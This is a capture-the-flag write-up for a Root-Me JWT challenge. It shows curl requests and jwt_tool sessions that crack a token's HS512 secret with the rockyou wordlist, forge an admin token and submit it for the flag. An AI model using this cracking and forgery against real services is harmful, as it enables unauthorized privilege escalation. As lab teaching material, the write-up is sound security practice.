The attack consists of :

Recover a valid token
Break the token's secret
Modify the token as required
Re-sign the token with the found secret
We start by retrieving a valid token.

$ curl http://challenge01.root-me.org/web-serveur/ch59/token

{“Here is your token”: “eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKgO3dBYbhblaPQsbeClcw”}
We use jwt_tool for the rest of the manipulation (https://github.com/ticarpi/jwt_tool).
Pass the recovered token and a good dictionary to break the secret (like rockyou) as arguments.

$ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKgO3dBYbhblaPQsbeClcw /usr/share/wordlists/rockyou.txt

Token header values:
[+] typ = JWT
[+] alg = HS512

Token payload values:
[+] role = guest

######################################################
# Options: #
# 1: Check CVE-2015-2951 - alg=None vulnerability #
# 2: Check for Public Key bypass in RSA mode #
# 3: Check signature against a key #
# 4: Check signature against a key file (“kid”) #
# 5: Crack signature with supplied dictionary file #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: /usr/share/wordlists/rockyou.txt
Testing 14344381 passwords...
[+] lol is the CORRECT key!
The secret has been correctly found: lol
Simply use the 6th option to modify the token data

$ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKgO3dBYbhblaPQsbeClcw

Token header values:
[+] typ = JWT
[+] alg = HS512

Token payload values:
[+] role = guest

######################################################
# Options: #
# 1: Check CVE-2015-2951 - alg=None vulnerability #
# 2: Check for Public Key bypass in RSA mode #
# 3: Check signature against a key #
# 4: Check signature against a key file (“kid”) #
# 5: Crack signature with supplied dictionary file #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit #
######################################################

Please make a selection (1-6)
> 6

Token header values:
[1] typ = JWT
[2] alg = HS512
[3] *ADD A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] role = guest
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of role is: guest
Please enter new value and hit ENTER
> admin
[1] role = admin
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token Signing:
[1] Sign token with known key
[2] Strip signature from token vulnerable to CVE-2015-2951
[3] Sign with Public Key bypass vulnerability
[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> lol

Please enter the keylength:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 3

Your new forged token:
[+] URL safe: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
[+] Standard: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x/S8F/VPAjra/S+nQ9MsRnuvwWFGoIyKXK8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
And the tool takes out the token, if that doesn't make the coffee.

Now we want to send our token to the server.

$ curl -XPOST http://challenge01.root-me.org/web-serveur/ch59/admin

{ “message”: “method to authenticate is: ‘Authorization: Bearer YOURTOKEN’”}

$ curl -XPOST -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ. y9GHxQbH70x/S8F/VPAjra/S+nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA' http://challenge01.root-me.org/web-serveur/ch59/admin

{ “result”: “Congrats!! Here is your flag: Please**********NextTime"}